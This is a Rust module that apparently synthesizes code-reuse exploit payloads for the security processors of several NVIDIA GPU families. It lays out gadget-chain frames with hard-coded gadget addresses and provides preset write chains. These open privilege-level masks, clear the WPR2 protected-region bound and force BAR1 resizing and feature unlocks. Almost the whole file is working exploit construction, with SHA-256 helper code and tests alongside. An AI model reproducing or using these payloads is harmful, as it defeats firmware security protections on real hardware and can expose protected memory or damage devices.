//! V67 payload synthesizer (G2) — the frame grammar engine.
//!
//! Input: the write chain (the only policy input) + the per-die geometry.
//! Output: the payload bytes, byte-identical to the pinned golden tables
//! (TU102 `b0ec9029…`, GA102 `2a0aa1f8…`, AD102 `44c36b2d…`).
//!
//! Frame grammar (recovered from generate_v67.py + the 10.4M-step trace,
//! see docs/first-principles-payload-generator.md):
//!
//! - fill word covers the whole image (TU102: 0x4A7, a self-loop-class
//!   constant; GA102 uses 0x19c)
//! - live frame (the waiter's mpopaddret-$r3 frame) at `live_frame`:
//!   [sp]=r3=guard, [sp+8]=r1=value, [sp+C]=r0=addr, [sp+0x14]=first gadget
//! - chain frames at `chain_base` + i*`stride`: [sp]=guard, [sp+8]=next
//!   value, [sp+C]=next addr, [sp+0x14]=next gadget (the last frame's
//!   gadget = teardown, patched to the token)
//! - tail block: the mutex-release cascade frames (per-die constants)
//! - scratch: D[main_sp+8] = 0, D[0x1700] = 7

pub const V67_SIZE: usize = 0xFA00;

/// Per-die geometry. TU102 values = the pinned golden (b0ec9029…).
pub struct Geometry {
    pub payload_size: usize,
    pub fill: u32,
    pub copy_base: u32,
    pub guard: u32,
    pub main_sp: u32,
    /// the waiter frame base (mpopaddret-$r3 shape)
    pub live_frame: u32,
    pub chain_base: u32,
    pub stride: u32,
    /// the write mid-entry gadget
    pub gad_write: u32,
    /// the teardown gadget (patched to the token on the last frame)
    pub gad_teardown: u32,
    /// the post-teardown token
    pub gad_token: u32,
    pub tail_base: u32,
    pub tail: TailBlock,
    pub token_value: u32,
    pub scratch_1700: u32,
}

/// The mutex-release cascade constants (all gadget addresses = per-die).
pub struct TailBlock {
    pub b00: u32,
    pub b04: u32,
    pub b08: u32,
    pub b0c: u32,
    pub b14: u32,
    pub b18: u32,
    pub b1c: u32,
    pub b20: u32,
    pub b24: u32,
    pub b2c: u32,
    pub b30: u32,
    pub b34: u32,
    pub b38: u32,
    pub b40: u32,
    pub b44: u32,
    pub b48: u32,
    pub b4c: u32,
    pub b54: u32,
    pub b58: u32,
    pub b5c: u32,
    pub b60: u32,
    pub b64: u32,
    pub b6c: u32,
}

impl Geometry {
    /// TU102 — reproduces b0ec9029… byte-for-byte.
    pub fn tu102() -> Self {
        Geometry {
            payload_size: V67_SIZE,
            fill: 0x0000_04A7,
            copy_base: 0x600,
            guard: 0x6140,
            main_sp: 0xFFF0,
            live_frame: 0xFF38,
            chain_base: 0xFF50,
            stride: 0x18,
            gad_write: 0x10B9,
            gad_teardown: 0x7C43,
            gad_token: 0xCBD,
            tail_base: 0xFF80,
            token_value: 0xFFFF, // main_sp + 0xF
            scratch_1700: 7,
            tail: TailBlock {
                b00: 1,
                b04: 0,
                b08: 0x8E18,
                b0c: 0,
                b14: 0xC95,
                b18: 0x6140, // guard
                b1c: 0,
                b20: 0,
                b24: 1,
                b2c: 0x1F89,
                b30: 0x6140, // guard
                b34: 0x6140, // guard
                b38: 0xFFFF, // token
                b40: 0x1F89,
                b44: 0x6140, // guard
                b48: 0x6140, // guard
                b4c: 0,
                b54: 0xE85,
                b58: 0x1F89,
                b5c: 0x6140, // guard
                b60: 0x6140, // guard
                b64: 0,
                b6c: 0x7EA4, // park
            },
        }
    }

    /// TU11x (TU116/117) — the TU102 frame grammar with the TU116 booter's
    /// park gadget. The scanner independently derives park = 0x7E9A
    /// ([ParkSelf, LBra] on TU116_sec_plain.bin; TU102's 0x7EA4 reads as
    /// [MmioWrite..] there, not a park). Validates against the pinned
    /// V67_TU11X_PAYLOAD_SHA256 (c79208ac…).
    pub fn tu11x() -> Self {
        let mut g = Self::tu102();
        g.tail.b6c = 0x7E9A; // park
        g
    }
}

/// Synthesize the payload for `writes` (the (addr, value) chain, in order).
pub fn synth(writes: &[(u32, u32)], geo: &Geometry) -> Vec<u8> {
    assert!(!writes.is_empty(), "the write chain must not be empty");
    let mut p = vec![0u8; geo.payload_size];
    let fill = geo.fill.to_le_bytes();
    for w in p.chunks_exact_mut(4) {
        w.copy_from_slice(&fill);
    }
    let mut put = |dmem: u32, v: u32| {
        let off = (dmem - geo.copy_base) as usize;
        assert!(off + 4 <= geo.payload_size, "put {dmem:#x} outside the image");
        p[off..off + 4].copy_from_slice(&v.to_le_bytes());
    };

    // scratch
    put(0x1700, geo.scratch_1700);

    // live frame (the waiter's): r3 slot = guard, r1 = value, r0 = addr,
    // the return slot = the first gadget
    let lf = geo.live_frame;
    put(lf, geo.guard);
    put(lf + 8, writes[0].1);
    put(lf + 0xC, writes[0].0);
    put(lf + 0x14, geo.gad_write);

    // chain frames: frame i carries write i+1's operands and the gadget
    // that leads to it; the last frame's gadget = the teardown, patched
    // to the post-teardown token
    let n = writes.len();
    for (i, w) in writes.iter().enumerate() {
        let sp = geo.chain_base + (i as u32) * geo.stride;
        put(sp, geo.guard);
        if i + 1 < n {
            put(sp + 8, writes[i + 1].1);
            put(sp + 0xC, writes[i + 1].0);
            put(sp + 0x14, geo.gad_write);
        } else {
            put(sp + 0x14, geo.gad_teardown);
        }
        let _ = w; // frame i's own operands live in frame i-1 / the live frame
    }
    // the last chain frame's operand slots and the token patch
    let last = geo.chain_base + ((n - 1) as u32) * geo.stride;
    put(last + 0xC, 0);
    put(last + 0x14, geo.gad_token);

    // tail block: the mutex-release cascade
    let a = geo.tail_base;
    let t = &geo.tail;
    put(a, t.b00);
    put(a + 4, t.b04);
    put(a + 8, t.b08);
    put(a + 0xC, t.b0c);
    put(a + 0x14, t.b14);
    put(a + 0x18, t.b18);
    put(a + 0x1C, t.b1c);
    put(a + 0x20, t.b20);
    put(a + 0x24, t.b24);
    put(a + 0x2C, t.b2c);
    put(a + 0x30, t.b30);
    put(a + 0x34, t.b34);
    put(a + 0x38, geo.token_value);
    put(a + 0x40, t.b40);
    put(a + 0x44, t.b44);
    put(a + 0x48, t.b48);
    put(a + 0x4C, t.b4c);
    put(a + 0x54, t.b54);
    put(a + 0x58, t.b58);
    put(a + 0x5C, t.b5c);
    put(a + 0x60, t.b60);
    put(a + 0x64, t.b64);
    put(a + 0x6C, t.b6c);

    // main frame scratch
    put(geo.main_sp + 8, 0);

    p
}

/// The GA-line/Ada payloads use a different frame grammar (the GA-line
/// booter's own epilogue shapes); their goldens are explicit put-lists
/// over the same 0x19c fill with the write-chain slots parameterized.
pub const GA_FILL: u32 = 0x19c;
pub const AD_FILL: u32 = 0x19c;

/// GA102: single-write payload (0x823804 ← value), terminator 0x81ee.
/// Reproduces 2a0aa1f8… byte-for-byte.
pub fn synth_ga102(writes: &[(u32, u32)]) -> Vec<u8> {
    assert!(!writes.is_empty(), "the write chain must not be empty");
    let mut p = vec![0u8; V67_SIZE];
    let fill = GA_FILL.to_le_bytes();
    for w in p.chunks_exact_mut(4) {
        w.copy_from_slice(&fill);
    }
    let mut put = |dmem: u32, v: u32| {
        let off = (dmem - 0x600) as usize;
        assert!(off + 4 <= V67_SIZE, "put {dmem:#x} outside the image");
        p[off..off + 4].copy_from_slice(&v.to_le_bytes());
    };
    let puts: [(u32, u32); 19] = [
        (0x1700, 7),
        (0xFF48, writes[0].1),
        (0xFF50, 0xD44),
        (0xFF60, writes[0].0),
        (0xFF68, 0x1FCE),
        (0xFF74, 0),
        (0xFF7C, 0x1101),
        (0xFF80, 0x84C8),
        (0xFF84, 0x8E18),
        (0xFF8C, 0x84C8),
        (0xFF90, 0),
        (0xFF98, 0x1FCE),
        (0xFFA4, 0xFFBC),
        (0xFFAC, 0x5789),
        (0xFFBC, 0xD44),
        (0xFFCC, 3),
        (0xFFD4, 0x1FCE),
        (0xFFE8, 0xD52),
        (0xFFEC, 0x81EE), // terminator
    ];
    for (dmem, v) in puts {
        put(dmem, v);
    }
    p
}

/// AD102: the four-PLM chain ((0x1fa7cc, 0xfffff0ff), (0x9a0148, 0xffffffff),
/// (0x1fa7c4, 0xffffffff), (0x823804, 0xffffffff)), mailbox `marker`,
/// the 0x31b5/0x771e close-out pair. With the stock marker (0x67b00001)
/// reproduces 44c36b2d… byte-for-byte; with the bar1 marker (0x67b00004)
/// and the bar1-64g write list reproduces cf3566d0… (the gpu-unlock-bar1
/// eight-card artifact).
pub fn synth_ad102(writes: &[(u32, u32)], marker: u32) -> Vec<u8> {
    assert!(writes.len() == 4, "the Ada chain is exactly four writes");
    let mut p = vec![0u8; V67_SIZE];
    let fill = AD_FILL.to_le_bytes();
    for w in p.chunks_exact_mut(4) {
        w.copy_from_slice(&fill);
    }
    let mut put = |dmem: u32, v: u32| {
        let off = (dmem - 0x600) as usize;
        assert!(off + 4 <= V67_SIZE, "put {dmem:#x} outside the image");
        p[off..off + 4].copy_from_slice(&v.to_le_bytes());
    };
    let puts: [(u32, u32); 25] = [
        (0x1700, 7),
        (0xFF48, writes[0].1),
        (0xFF50, 0x21B2),
        (0xFF60, writes[0].0),
        (0xFF68, 0x33FC),
        (0xFF74, writes[1].1),
        (0xFF7C, 0x256F),
        (0xFF80, 0x7A02),
        (0xFF84, writes[1].0),
        (0xFF8C, 0x33FC),
        (0xFF98, writes[2].1),
        (0xFFA0, 0x256F),
        (0xFFA4, 0x7A02),
        (0xFFA8, writes[2].0),
        (0xFFB0, 0x33FC),
        (0xFFBC, writes[3].1),
        (0xFFC4, 0x256F),
        (0xFFC8, 0x7A02),
        (0xFFCC, writes[3].0),
        (0xFFD4, 0x33FC),
        (0xFFE0, marker), // the mailbox marker
        (0xFFE8, 0x256F),
        (0xFFEC, 0x7A02),
        (0xFFF8, 0x31B5),
        (0xFFFC, 0x771E),
    ];
    for (dmem, v) in puts {
        put(dmem, v);
    }
    p
}

/// All supported families (single source for CLI validation and tests).
pub const FAMILIES: [&str; 4] = ["tu102", "tu11x", "ga102", "ad102"];

/// Stock AD102 mailbox marker (the Ada four-write payload verdict).
pub const MARKER_AD102: u32 = 0x67B0_0001;
/// AD102 bar1 marker (gpu-unlock-bar1; the eight-card 64G artifact).
pub const MARKER_AD102_BAR1: u32 = 0x67B0_0004;

/// Mechanical write-chain budget per family — how many chained writes the
/// die's frame grammar carries. For the Turing grammar it falls out of the
/// geometry: the chain frames must fit between chain_base (0xff50) and
/// tail_base (0xff80), stride 0x18 → two frames; a third collides with the
/// mutex-release tail (the documented CMP-Gen2 third-write blocker). For
/// the GA/Ada put-list templates the budget is the template's write-slot
/// capacity. This turns the frame-arithmetic boundary into a mechanical
/// check instead of a documented number.
pub fn write_budget(family: &str) -> usize {
    match family {
        "tu102" | "tu11x" => {
            let g = Geometry::tu102();
            ((g.tail_base - g.chain_base) / g.stride) as usize
        }
        "ga102" => 1, // the 19-word put-list carries exactly one write
        "ad102" => 4, // the 25-word put-list carries exactly four writes
        _ => 0,
    }
}

/// Human-readable per-die budget table (printed on budget refusal).
pub fn budget_table() -> String {
    FAMILIES
        .iter()
        .map(|f| {
            let n = write_budget(f);
            format!("  {f}: {} {}", n, if n == 1 { "write" } else { "writes" })
        })
        .collect::<Vec<_>>()
        .join("\n")
}

/// Gate preset "ss": the stock per-family unlock write chains. Each list
/// reproduces its pinned payload table byte-for-byte (tests/goldens.rs):
/// tu102 → b0ec9029…, tu11x → c79208ac…, ga102 → 2a0aa1f8…, ad102 → 44c36b2d….
/// Turing: open the FEAT PLM (0x409650) then clear WPR2_HI (0x1fa828).
/// GA10x: open FEAT_OVR_PLM (0x823804); SS0/SS1 are host-side writes after.
/// Ada: the WPR_CFG → FBPA → WPR → FEAT four-write chain.
pub fn preset_ss(family: &str) -> Option<Vec<(u32, u32)>> {
    match family {
        "tu102" | "tu11x" => Some(vec![(0x0040_9650, 0xffff_ffff), (0x001f_a828, 0)]),
        "ga102" => Some(vec![(0x0082_3804, 0xffff_ffff)]),
        "ad102" => Some(vec![
            (0x001f_a7cc, 0xffff_f0ff),
            (0x009a_0148, 0xffff_ffff),
            (0x001f_a7c4, 0xffff_ffff),
            (0x0082_3804, 0xffff_ffff),
        ]),
        _ => None,
    }
}

/// Gate preset "bar1": the AD102 BAR1-size construction (gpu-unlock-bar1).
/// The size field is the 64MiB<<i table, cross-checked on three stock
/// readbacks: TU106 CFG 0x02 = 256MiB (i=2), AD102 stock CFG 0x9 = 32GiB
/// (i=9 — the FLR "restore to 32 GiB" note), 64GiB = 0xa (i=10, proven).
/// CYA fits `(index-4)<<3` on both observed AD102 points (0x28@32G,
/// 0x30@64G), so any size other than 64GiB is an UNPROVEN 2^n construction
/// (simulation-validated only). Returns None outside the table domain.
pub fn preset_bar1(size_gib: u32) -> Option<(Vec<(u32, u32)>, bool)> {
    if size_gib < 16 || size_gib > 1024 || !size_gib.is_power_of_two() {
        return None;
    }
    let index: u32 = size_gib.trailing_zeros() + 4; // 64MiB << index == size
    let cya = (index - 4) << 3;
    let cfg = 0x8000_0000 | index;
    let writes = vec![
        (0x0008_8724, cya),         // CYA
        (0x0008_8dcc, cfg),         // CFG size index
        (0x0008_8ff4, 0xffff_ffff), // XVE PLM open
        (0x0082_3804, 0xffff_ffff), // FEAT PLM open (keeps the tensor unlock)
    ];
    Some((writes, size_gib == 64))
}

/// Minimal SHA-256 (FIPS 180-4 transcription; the crate stays zero-dep so
/// the digest is hand-rolled — pinned by the known-answer tests below and,
/// indirectly, by the golden payload SHAs in tests/goldens.rs).
pub fn sha256_hex(data: &[u8]) -> String {
    let mut h = [0u32; 8];
    h.copy_from_slice(&[
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab,
        0x5be0cd19,
    ]);
    let k: [u32; 64] = [
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4,
        0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe,
        0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f,
        0x4a7484aa, 0x5cb0a9dc, 0x76f988da, 0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
        0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc,
        0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,
        0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070, 0x19a4c116,
        0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7,
        0xc67178f2,
    ];
    let mut msg = data.to_vec();
    let bitlen = (data.len() as u64) * 8;
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&bitlen.to_be_bytes());
    for block in msg.chunks_exact(64) {
        let mut w = [0u32; 64];
        for i in 0..16 {
            w[i] = u32::from_be_bytes(block[i * 4..i * 4 + 4].try_into().unwrap());
        }
        for i in 16..64 {
            let s0 = w[i - 15].rotate_right(7) ^ w[i - 15].rotate_right(18) ^ (w[i - 15] >> 3);
            let s1 = w[i - 2].rotate_right(17) ^ w[i - 2].rotate_right(19) ^ (w[i - 2] >> 10);
            w[i] = w[i - 16]
                .wrapping_add(s0)
                .wrapping_add(w[i - 7])
                .wrapping_add(s1);
        }
        let (mut a, mut b, mut c, mut d, mut e, mut f, mut g, mut hh) =
            (h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7]);
        for i in 0..64 {
            let s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
            let ch = (e & f) ^ (!e & g);
            let t1 = hh
                .wrapping_add(s1)
                .wrapping_add(ch)
                .wrapping_add(k[i])
                .wrapping_add(w[i]);
            let s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
            let maj = (a & b) ^ (a & c) ^ (b & c);
            let t2 = s0.wrapping_add(maj);
            hh = g;
            g = f;
            f = e;
            e = d.wrapping_add(t1);
            d = c;
            c = b;
            b = a;
            a = t1.wrapping_add(t2);
        }
        for (hi, v) in h.iter_mut().zip([a, b, c, d, e, f, g, hh]) {
            *hi = hi.wrapping_add(v);
        }
    }
    h.iter().map(|x| format!("{x:08x}")).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sha256_known_answers() {
        assert_eq!(
            sha256_hex(b""),
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
        assert_eq!(
            sha256_hex(b"abc"),
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
        );
        // > one block: 56-byte input forces padding into a second block
        assert_eq!(
            sha256_hex(&[b'a'; 56]),
            "b35439a4ac6f0948b6d6f9e3c6af0f5f590ce20f1bde7090ef7970686ec6738a"
        );
    }

    #[test]
    fn budgets_match_the_frame_arithmetic() {
        assert_eq!(write_budget("tu102"), 2);
        assert_eq!(write_budget("tu11x"), 2);
        assert_eq!(write_budget("ga102"), 1);
        assert_eq!(write_budget("ad102"), 4);
        assert_eq!(write_budget("gb20x"), 0); // no SEC2 carrier, not a family
    }

    #[test]
    fn bar1_table_is_two_to_the_n() {
        let (w, proven) = preset_bar1(64).unwrap();
        assert!(proven);
        assert_eq!(w[0], (0x88724, 0x30));
        assert_eq!(w[1], (0x88dcc, 0x8000_000a));
        // the observed stock words reproduce under the same rule
        let (w, _) = preset_bar1(32).unwrap();
        assert_eq!(w[0], (0x88724, 0x28));
        assert_eq!(w[1], (0x88dcc, 0x8000_0009));
        // 128GiB: constructible, UNPROVEN (beyond the documented table end)
        let (w, proven) = preset_bar1(128).unwrap();
        assert!(!proven);
        assert_eq!(w[0], (0x88724, 0x38));
        assert_eq!(w[1], (0x88dcc, 0x8000_000b));
        assert!(preset_bar1(48).is_none()); // not 2^n
        assert!(preset_bar1(8).is_none()); // below the CYA rule domain
        assert!(preset_bar1(2048).is_none()); // beyond the 4-bit index
    }
}
